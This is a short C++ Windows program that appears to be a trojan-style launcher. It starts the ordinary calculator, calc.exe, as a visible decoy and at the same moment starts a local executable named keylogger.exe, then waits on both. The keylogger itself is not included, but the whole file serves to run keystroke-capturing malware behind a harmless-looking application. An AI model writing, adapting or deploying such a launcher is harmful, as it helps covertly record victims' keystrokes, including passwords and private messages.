#include <Windows.h>
#include <tchar.h>
#include <iostream>

int _tmain(int argc, _TCHAR* argv[])
{
    //process 1
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    LPCTSTR lpApplicationName = _T("C:\\Windows\\System32\\calc.exe");
    

    //process 2
    STARTUPINFO si_2;
    PROCESS_INFORMATION pi_2;

    ZeroMemory(&si_2, sizeof(si_2));
    si_2.cb = sizeof(si_2);
    ZeroMemory(&pi_2, sizeof(pi_2));
    LPCTSTR lpApplication_2 = _T(".\\keylogger.exe");

    // Start the child process.
    if (!CreateProcess(lpApplicationName,   // No module name (use command line)
        NULL,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
    )
    {
        std::cout << "CreateProcess 1 failed. Error code: " << GetLastError() << std::endl;
        return 1;
    }
    
    
    
    if (!CreateProcess(lpApplication_2,   // No module name (use command line)
        NULL,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si_2,            // Pointer to STARTUPINFO structure
        &pi_2)           // Pointer to PROCESS_INFORMATION structure
    )
    {
        std::cout << "CreateProcess 2 failed. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    
    WaitForSingleObject(pi.hProcess, INFINITE);

    WaitForSingleObject(pi_2.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    CloseHandle(pi_2.hProcess);
    CloseHandle(pi_2.hThread);

    return 0;
}
